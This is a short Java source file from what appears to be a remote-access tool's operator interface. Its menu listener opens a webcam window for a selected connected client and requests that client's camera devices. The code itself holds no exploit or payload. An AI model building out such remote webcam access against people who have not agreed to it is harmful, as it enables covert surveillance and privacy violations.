package GUI.TableUtils.Webcam;

import Connections.Client;
import Connections.ClientHandler;
import Connections.Streams;
import GUI.Main;
import GUI.SplinterGUI;
import GUI.TableUtils.Configuration.GetSYS;
import GUI.TableUtils.Configuration.SocketType;
import GUI.TableUtils.Webcam.WebcamManager.WebcamGUI;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class WebcamMenuListener implements ActionListener {
    private final SplinterGUI mainGUI;

    public WebcamMenuListener(SplinterGUI mainGUI) {
        this.mainGUI = mainGUI;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Client client = GetSYS.getClientHandlerV2();
        WebcamGUI webcamGUI = new WebcamGUI(client, mainGUI.getMainGUI());
        assert client != null;
        client.updater.setWebcamGUI(webcamGUI);
        webcamGUI.getDevices();

    }
}
